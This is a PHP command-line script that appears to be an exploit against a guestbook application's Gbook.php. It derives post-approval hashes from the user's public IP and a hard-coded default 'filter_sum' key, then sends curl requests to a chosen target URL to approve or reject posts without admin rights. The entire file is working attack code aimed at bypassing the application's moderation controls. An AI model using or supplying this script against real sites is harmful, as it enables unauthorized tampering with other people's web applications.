<?php
	function get_hash(){
		echo "\nHash fetcher\n\n";
		echo "Your public IP: ";
		$getip = fopen('php://stdin','r');
		$getip_handle = fgets($getip);

		echo "filter_sum key [if input is empty, default key will be used]: ";
		$getkey = fopen('php://stdin','r');
		$filter = fgets($getkey);



		if(trim($getip_handle) == ''){
			echo "\n[-] You must enter your public IP\n";
			echo "[!] If you don't know it, go to https://myip.com/\n\n";
			exit(1);
		}

		if(trim($filter) == ''){
			$filter = "2kc7DPFf464HG7JCb5CK";
		}
		echo "\nIP: ".trim($getip_handle)."\n";
		echo "Key: ".trim($filter)."\n";
		echo "\n";

		$hash = md5(trim($getip_handle).trim($filter));
		echo "Hash: ".$hash."\n";
		exit(1);
	}
	
	function approve_post(){
		echo "\nNon-admin Post Approval\n\n";
		echo "Your public IP: ";
		$getip = fopen('php://stdin','r');
		$getip_handle = fgets($getip);
		
		echo "Gbook.php path [include schema too (https,http)]: ";
		$get_target = fopen('php://stdin','r');
		$get_target_handle = fgets($get_target);
		
		echo "filter_sum key [if input is empty, default key will be used]: ";
		$getkey = fopen('php://stdin','r');
		$filter = fgets($getkey);
		
		echo "Would you like to approve your post [y/n]: ";
		$get_appr = fopen('php://stdin','r');
		$get_appr_handle = fgets($get_target);
		
		$get_appr_handle = strtolower($get_appr_handle);
		
		if(trim($getip_handle) == ''){
			echo "\n[-] You must enter your public IP.\n";
			echo "[!] If you don't know it, go to https://myip.com/\n\n";
			exit(1);
		}
	
		if(trim($get_target_handle) == ''){
			echo "\n[-] You must enter your target's URL for this to work.\n";
			exit(1);
		}
		
		if(trim($get_appr_handle) == ''){
			echo "\n[-] Invalid option.\n";
			exit(1);
		}
		
		if(trim($get_appr_handle) != 'y' && trim($get_appr_handle) != 'n'){
			echo "\n[-] Invalid option.\n";
			exit(1);
		}
		
		if(trim($filter) == ''){
			$filter = "2kc7DPFf464HG7JCb5CK";
		}
		echo "\nIP: ".trim($getip_handle)."\n";
		echo "Key: ".trim($filter)."\n";
		echo "\n";

		$hash = md5(trim($getip_handle).trim($filter));
		echo "Hash: ".$hash."\n";
		echo "\n[+] Making request!\n";
		$get_target_handle = trim($get_target_handle);
		switch(trim($get_appr_handle)){
			case 'y':
				
				$params = array('a' => 'approve','id'=>trim($hash),'do'=>1);
				
				$url = $get_target_handle;
				$curl = curl_init($url);
				$url = $get_target_handle."?".http_build_query($params);
				curl_setopt($curl, CURLOPT_URL, $url);
				curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
				$response = curl_exec($curl);
				curl_close($curl);
				echo "[+] Post approved successfully!\n";
				exit(1);
			case 'n':
				$params = array('a' => 'approve','id'=>trim($hash));
				$url = $get_target_handle;
				$curl = curl_init($url);
				$url = $get_target_handle."?".http_build_query($params);
				curl_setopt($curl, CURLOPT_URL, $url);
				curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
				$response = curl_exec($curl);
				curl_close($curl);
				echo "[+] Post rejected successfully!\n";
				exit(1);
		}

   		
	}


?>
